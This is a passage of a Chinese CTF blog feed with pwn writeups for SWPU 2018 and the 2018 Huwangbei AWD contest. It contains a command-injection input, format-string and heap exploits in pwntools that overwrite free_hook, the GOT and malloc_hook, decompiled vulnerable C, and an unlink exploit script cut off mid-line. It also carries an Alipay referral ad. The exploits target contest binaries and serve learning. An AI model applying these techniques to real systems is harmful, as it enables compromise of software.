class="number">3</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'%&#123;&#125;c%11$hhn%&#123;&#125;c%12$hhn'</span>.format(X4,(X5-X4)&amp;<span class="number">0xff</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">24</span>,<span class="string">'a'</span>) + p64(free_hook+<span class="number">4</span>) + p64(free_hook+<span class="number">5</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,payload)</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'name:\n'</span>,<span class="string">'%214c%11$hhn%51c%12$hhn!'</span>+p64(elf.got[<span class="string">'free'</span>])+p64(elf.got[<span class="string">'free'</span>]+<span class="number">1</span>))</span><br><span class="line">skip()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><h3 id="基础android"><a href="#基础android" class="headerlink" title="基础android"></a>基础android</h3><p>apk里面有一个zip文件，其实是个jpg，修改后缀打开</p><h3 id="android-2-0"><a href="#android-2-0" class="headerlink" title="android 2.0"></a>android 2.0</h3><p>关键算法在so里面，程序将15位输入分成3块，每块在进行一次简单的运算，直接逆一下就行了。</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><ol><li>修改分辨率得到一部分flag</li><li>文件末位有另一部分flag</li></ol><h3 id="唯有低头-才能出头"><a href="#唯有低头-才能出头" class="headerlink" title="唯有低头,才能出头"></a>唯有低头,才能出头</h3><p>举头望明月,低头…  ，（看键盘）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">99 9 9 88 5 66 3 3 666 33 88 3 6 555 9 11 4 33</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">looktheendkeyboard</span><br></pre></td></tr></table></figure><h3 id="流量签到"><a href="#流量签到" class="headerlink" title="流量签到"></a>流量签到</h3><p>直接搜关键字</p><h2 id="广告"><a href="#广告" class="headerlink" title="广告"></a>广告</h2><p>各位大佬帮我薅羊毛啊</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">打开支付宝首页搜“575219”领红包，领到大红包的小伙伴赶紧使用哦！</span><br></pre></td></tr></table></figure><p><img src="http://ww1.sinaimg.cn/large/6701be31gy1fyd1myrti1j20fs0noq4z.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;swpu2018&quot;&gt;&lt;a href=&quot;#swpu2018&quot; class=&quot;headerlink&quot; title=&quot;swpu2018&quot;&gt;&lt;/a&gt;swpu2018&lt;/h1&gt;&lt;p&gt;年底忙成狗，没什么时间，花了两个晚上的时间，做了一下简单的题目，还有些题目后面继续补。&lt;/p
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>首届护网杯AWD PWN题writeup</title>
    <link href="https://4f-kira.github.io/2018/11/06/huwangbei-awd-pwn/"/>
    <id>https://4f-kira.github.io/2018/11/06/huwangbei-awd-pwn/</id>
    <published>2018-11-06T12:53:16.000Z</published>
    <updated>2018-11-06T13:14:16.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个月在护网杯打了个酱油，第一次打某宁的线下赛，风格跟某春秋差别还是挺大的，没什么端口限制，提flag接口也很友好，属于最开放的网络环境了，可以用各种大杀器（然而我没有准备= =|||）。比赛当时只用到了最简单的洞，虽然官方给了流量（队友不说我都没发现。。。），但是没啥经验，比赛的时候也没成功重放。总体来说题目质量不错，难得有攻击流量，赛后来学习一波吧~</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>这题有一个超级简单的命令执行洞，直接<code>ls</code>后闭合命令就可以了，如<code>/ &amp;&amp; cat ../flag</code>。另外还有一个堆的洞，网上有大神分析过，我就不写了，直接给EXP，原理差不多，漏洞利用方式略有不同而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msend</span><span class="params">(size,smsg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'send'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'send:'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Content:'</span>,smsg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mrecv</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'recv'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'recv:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mencode</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'encode'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'encode:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mdecode</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'decode'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'decode:'</span>,str(size))</span><br><span class="line"></span><br><span class="line">msend(<span class="number">0x500</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">msend(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">mencode(<span class="number">8</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">mdecode(<span class="number">8</span>)</span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> + <span class="number">0xff</span>) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">msend(<span class="number">0x100</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">mrecv(<span class="number">0x78</span>) <span class="comment"># 0x80</span></span><br><span class="line">mrecv(<span class="number">0x68</span>) <span class="comment"># 0x70 fastbins</span></span><br><span class="line">fake_fd = libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x78</span> + p64(<span class="number">0x71</span>) + p64(fake_fd) <span class="comment"># len = 0x88</span></span><br><span class="line">msend(<span class="number">0x100</span>,payload)</span><br><span class="line">mencode(<span class="number">0x88</span>)</span><br><span class="line">mrecv(<span class="number">0x78</span>) <span class="comment"># overwrite fastbins#0x70-&gt;fd</span></span><br><span class="line">mdecode(<span class="number">0x88</span>)</span><br><span class="line">msend(<span class="number">0x68</span>,<span class="string">''</span>.ljust(<span class="number">0x13</span><span class="number">-8</span>,<span class="string">'a'</span>)+p64(libc.address+<span class="number">0x4526a</span>)+p64(libc.sym[<span class="string">'__libc_realloc'</span>]+<span class="number">8</span>))</span><br><span class="line">mencode(<span class="number">0x20</span>)</span><br><span class="line">mrecv(<span class="number">0x68</span>) <span class="comment"># overwrite  malloc_hook</span></span><br><span class="line">mdecode(<span class="number">0x20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'send'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'send:'</span>,str(<span class="number">0</span>)) <span class="comment"># trigger malloc</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>这题的复杂程度简直丧心病狂，在此膜一下腾讯的大佬，4小时的比赛能做出这题目。从流量来看，很多队伍都是重发腾讯的流量，还有一队是另一种解法，姿势也是很值得学习。这条题一堆的结构体，单是看程序逻辑都看了半天。大佬们都是风水大师，堆风水6得飞起。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这题目的主要功能有两个，一个是操作<code>cake</code>的流程，一个是操作<code>account</code>的流程。其中需要关键操作（对账号操作，对蛋糕下单）需要<code>admin</code>权限，留意程序初始化生成了一个<code>admin</code>账号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">init_admin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  is_admin[<span class="number">0</span>] = <span class="number">1L</span>L;</span><br><span class="line">  account_id[<span class="number">0</span>] = <span class="number">1L</span>L;</span><br><span class="line">  user_db[<span class="number">0</span>] = (struct user *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  money[<span class="number">0</span>] = <span class="number">880L</span>L;</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;name, <span class="string">"Admin"</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;password, <span class="string">"admin"</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;desc, <span class="string">"what ? this is cake ???"</span>, <span class="number">0x58</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>cake操作</li></ol><p>几个重要的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> taste[<span class="number">8</span>];</span><br><span class="line">  __int32 number;</span><br><span class="line">  __int32 code;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> random_num[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">int</span> cake_number;</span><br><span class="line">  <span class="keyword">char</span> cake_taste[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> cake_code[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake_order</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> taste[<span class="number">8</span>];</span><br><span class="line">  __int32 number;</span><br><span class="line">  __int32 price;</span><br><span class="line">  <span class="keyword">char</span> *desc;  <span class="comment">// 0x7c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>购买<code>cake</code>的过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- add_to_list | malloc(0x18) 新增一个list</span><br><span class="line">- order_cake | malloc(0x18) -&gt; malloc(0x7c) -&gt; free(0x18) 新增order及其desc，所有order完成后，从后往前清掉所有list</span><br><span class="line">- cancel_list | free(0x18) 取消一个list</span><br><span class="line">- buy | free(0x7c) -&gt; free(0x18) -&gt; malloc(0x4b0) 清除list的desc，清除list，新增一个desc</span><br></pre></td></tr></table></figure></p><p>内存泄露漏洞点在，创建新<code>cake_list</code>的时候，没有初始化内存，生成的随机数只有一位，重新利旧<code>bins</code>的时候只会覆盖<code>fd</code>的最低位，打印<code>cake_list</code>信息的时候可以泄露地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new_cake_list = (struct cake_list *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">v1 = random_();</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;s, <span class="string">"%d"</span>, v1);</span><br><span class="line"><span class="built_in">strncpy</span>(new_cake_list-&gt;random_num, &amp;s, <span class="number">1u</span>LL);</span><br><span class="line">new_cake_list-&gt;cake_number = cake[v3]-&gt;number;</span><br><span class="line"><span class="built_in">strncpy</span>(new_cake_list-&gt;cake_taste, cake[v3]-&gt;taste, <span class="number">8u</span>LL);</span><br><span class="line">*(_DWORD *)new_cake_list-&gt;cake_code = cake[v3]-&gt;code;</span><br><span class="line">cake_list[list_count++] = new_cake_list;</span><br><span class="line">show_cake_list();</span><br></pre></td></tr></table></figure><ol><li>account操作</li></ol><p>结构体如下：(其中<code>user_list</code>存在<code>bss</code>段)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __int64 unknown1;</span><br><span class="line">  __int64 unknown2;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">8</span>];</span><br><span class="line">  __int64 used_tag;</span><br><span class="line">  <span class="keyword">char</span> desc[<span class="number">88</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __int64 is_admin;</span><br><span class="line">  __int64 account_id;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">user_data</span>;</span></span><br><span class="line">  __int64 money;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对<code>account</code>可以进行注册，删除，修改密码这3个操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 注册：malloc(0x80)</span><br><span class="line">- 删除：free(0x80)，没有清空user_list内容</span><br><span class="line">- 修改密码：修改user_data的password字段，8字节</span><br></pre></td></tr></table></figure><p>存在一个明显的<code>UAF</code>，如果能控制<code>user_data</code>，就能任意地址写。</p><p>留意<code>delete_account</code>一个坑点，user删除之后，虽然不会清空<code>user_data</code>指针，但是指针<code>-16</code>了，本来创建一个<code>0x20</code>大小的chunk后，利用UAF可以很轻易地修改<code>chunk size</code>,现在需要将两个<code>0x90</code>的chunk拼起来再padding一堆<code>0x20</code>大小的chunk才能修改<code>chunk size</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( is_admin[<span class="number">4</span> * v3] == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  is_admin[<span class="number">4</span> * v3] = <span class="number">0L</span>L;</span><br><span class="line">  user_data[<span class="number">4</span> * v3]-&gt;used_tag = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The account(%s) deleted success .\n"</span>, user_data[<span class="number">4</span> * v3]-&gt;name);</span><br><span class="line">  <span class="built_in">memset</span>(user_data[<span class="number">4</span> * v3], <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">free</span>(user_data[<span class="number">4</span> * v3]);</span><br><span class="line">  user_data[<span class="number">4</span> * v3] = (struct user *)((<span class="keyword">char</span> *)user_data[<span class="number">4</span> * v3] - <span class="number">16</span>); <span class="comment">// 这里是坑</span></span><br></pre></td></tr></table></figure><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><h4 id="解题方法一"><a href="#解题方法一" class="headerlink" title="解题方法一"></a>解题方法一</h4><p>首先需要泄露地址，方法很简单</p><ol><li>创建一个新账号（chunk是一个<code>unsorted bins</code>）</li><li>利用<code>add_to_list</code>创建一个新list</li><li>删掉这个账号</li><li>此时利用<code>add_to_list</code>创建一个新list就可以利旧刚刚free的user的chunk，<code>unsorted bins</code>的<code>fd</code>就能泄露出来</li></ol><p>gets hell方法是：使用<code>unlink</code>控制<code>user_data</code>指针，然后劫持got表，关键时如何构造<code>fake chunk</code></p><p>这题目，可控制的输入点只有几个：</p><ol><li>创建账号时输入的<code>name</code>，<code>password</code>，<code>profile</code>，然而删除的时候内存会清空，并没有什么用</li><li>下order时输入的<code>desc</code>，这个比较好用长度有<code>0x7c</code></li><li>购买cake后输入的<code>desc</code>，这个输入长度有<code>0x4b0</code>，也很好用</li></ol><p>构造关键点：</p><ol><li>由于上面提到<code>delete_account</code>的坑，需要将两个<code>0x90</code>的chunk，连在一起使用，才能修改<code>Chunk size</code></li><li>程序没有<code>double free</code>和堆溢出，需要使<code>allocated chunk</code>和<code>free chunk</code>重叠</li></ol><p>构造步骤如下：</p><ul><li>创建一个新账号  <code>chunk 0x90</code></li><li>创建一个新list0 <code>chunk 0x20</code></li><li>创建一个新order0 <code>chunk 0x20 chunk 0x90</code> （会删除list0 <code>free 0x20</code>）</li><li>创建一个新账号  <code>chunk 0x90</code></li><li>创建两个新list0，list1 <code>chunk 0x20</code> <code>chunk 0x20</code></li><li>删除list0 <code>free 0x20</code></li><li>删除user2 <code>free 0x90</code></li><li>创建一个新order1 <code>chunk 0x20 chunk 0x90</code>（会删除list1 <code>free 0x20</code>）</li><li>创建两个新list0，list1 <code>chunk 0x20</code> <code>chunk 0x20</code></li><li>删除user3 <code>free 0x90</code></li><li>购买order0 <code>free 0x90 free 0x20 chunk 0x4c0</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocated 0x90 #user2 =&gt; order1[desc]</span><br><span class="line">allocated 0x20 #list0 =&gt; list0 =&gt; order1</span><br><span class="line">freed     0x20 #order0</span><br><span class="line">freed     0x90 #order0[desc]</span><br><span class="line">freed     0x90 #user3</span><br><span class="line">allocated 0x20 #list1 =&gt; list0</span><br><span class="line">allocated 0x20 #list1 =&gt; list1</span><br><span class="line">allocated 0x4c0#desc0</span><br></pre></td></tr></table></figure><p>此时，3个<code>freed chunk</code>会合并一起为一个<code>unsorted bins</code>，继续创建新list2-8。这时候，发现修改<code>user3</code>的<code>password</code>，可以修改<code>list8</code>的<code>size</code>，如果把<code>size</code>修改为<code>0x581</code>(0x4c0+0x20+0x20+0x80)，那么删除<code>list8</code>，就能把下面一整片的内存都free掉，<code>top chunk</code>被抬高。</p><p>继续删掉list4-7，然后下order时，会创建<code>desc</code>，会从<code>top chunk</code>处开始分配内存，这个<code>chunk</code>的最后16字节，刚好覆盖到<code>list0</code>的<code>chunk head</code>，经过精心构造，删除<code>list0</code>的时候就可以触发<code>unlink</code>。</p><p>观察一下当前heap的结构，<code>list0</code>前面可控的<code>chunk</code>有<code>order1[desc]</code>，可以在这里构造<code>fake chunk</code>，<code>p64(&amp;p-0x18)+p64(&amp;p-0x10)</code>。将<code>list0</code>的<code>chunk head</code>改为<code>p64(0x1f0)+p64(90)</code>，同时下一块<code>chunk</code>需要补两个<code>allocated chunk</code>，可以在<code>desc0</code>中预留。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(newID=<span class="string">''</span>,newPWD=<span class="string">''</span>,newDESC=<span class="string">''</span>,reg=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> reg:</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'12345'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'12345'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'Register Your User?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your New ID.\n'</span>,newID)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your New Password.\n'</span>,newPWD)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your profile.\n'</span>,newDESC)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'Admin'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'admin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'9'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'sign out?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'4'</span>) <span class="comment"># enter order menu</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_order_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'5'</span>) <span class="comment"># exit order menu</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_list</span><span class="params">(code)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'&gt;'</span>,str(code))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_cake</span><span class="params">(price,desc)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'0) Yes, 1) No\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(desc)):</span><br><span class="line">        p.sendafter(<span class="string">'Enter the price'</span>,str(price[i]))</span><br><span class="line">        p.sendafter(<span class="string">'Enter a description'</span>,desc[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel_list</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">account_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_accont</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'delete\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(idx,pwd)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">' change PW\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'New Password.\n'</span>,pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_cake</span><span class="params">(code,number,desc)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'be purchased.\n'</span>,str(code))</span><br><span class="line">    p.sendafter(<span class="string">'to purchase.\n'</span>,str(number))</span><br><span class="line">    p.sendafter(<span class="string">'comment for cake.\n'</span>,desc)</span><br><span class="line"></span><br><span class="line">login(<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,reg=<span class="number">1</span>)</span><br><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span 